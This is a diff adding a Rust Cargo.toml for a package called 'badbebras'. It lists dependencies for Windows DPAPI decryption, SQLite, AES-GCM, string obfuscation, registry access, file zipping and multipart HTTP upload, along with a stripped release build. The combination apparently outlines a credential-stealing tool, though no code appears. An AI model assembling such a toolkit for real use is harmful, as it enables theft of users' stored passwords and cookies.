@@ -1,0 +1,32 @@
+[package]
+name = "badbebras"
+version = "0.1.0"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[dependencies]
+sysinfo = "0.26.4"
+serde_json = "1.0.83"
+winapi = { version = "0.3.9", features = ["dpapi"] }
+base64 = "0.13.0"
+obfstr = "0.4.1"
+rusqlite = { version = "0.29.0", features = ["bundled"] }
+dirs-next = "2.0.0"
+uuid = { version = "1.1.2", features = ["v4"] }
+aes-gcm = "0.10.1"
+winreg = "0.10"
+hex="0.4.3"
+rand = "0.5.5"
+zip = "0.6.3"
+walkdir = "2"
+reqwest = { version = "0.11", features = ["multipart", "json", "stream"] }
+tokio = { version = "1.22.0" , features = ["full"]}
+tokio-util = "0.7.4"
+serde = { version = "1.0.148", features = ["derive"] }
+
+[profile.release]
+strip = true
+opt-level = "z"
+lto = true
+codegen-units = 1
